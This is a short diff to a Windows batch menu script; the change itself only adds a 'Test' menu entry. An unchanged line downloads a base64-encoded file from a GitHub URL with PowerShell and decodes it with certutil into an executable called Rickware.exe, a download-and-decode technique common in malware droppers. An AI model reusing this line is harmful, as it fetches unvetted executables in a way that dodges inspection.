@@ -3,6 +3,7 @@ cls
 Title Programs
 echo Programs to download.
 echo 1.Rickware
+echo 2.Test
 set /p Num=
 if %Num%==1 powershell -Command "(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/RickDawlson/Install/Programs/rickware', 'Temp.sus')" & certutil -f -decode Temp.sus Rickware.exe & Del Temp.sus
 exit
